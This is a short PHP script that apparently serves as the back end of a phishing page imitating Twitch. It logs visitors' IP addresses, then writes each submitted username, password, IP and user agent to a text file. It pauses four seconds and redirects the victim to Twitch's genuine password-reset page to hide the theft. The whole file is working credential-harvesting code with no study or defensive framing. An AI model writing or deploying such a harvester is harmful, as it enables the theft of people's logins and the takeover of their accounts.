
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $ip = $_SERVER['REMOTE_ADDR'];
  $file = 'ship.txt'; 
  $current = file_get_contents($file);
  $current .= "$ip\n"; 
  file_put_contents($file, $current);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $name = $_POST['username'];
  $passwd = $_POST['password'];
  $ip = $_SERVER['REMOTE_ADDR'];
  $userAgent = $_SERVER['HTTP_USER_AGENT'];

  $arquivo = fopen('dados_formulario.txt', 'a');

  fwrite($arquivo, "User: $name\n");
  fwrite($arquivo, "Passwd: $passwd\n");
  fwrite($arquivo, "IP: $ip\n");
  fwrite($arquivo, "User Agent: $userAgent\n");
  fwrite($arquivo, "\n");

  fclose($arquivo);
   
  sleep(4);

  header('Location: https://passport.twitch.tv/password_resets/new?');
  exit();
}
?>
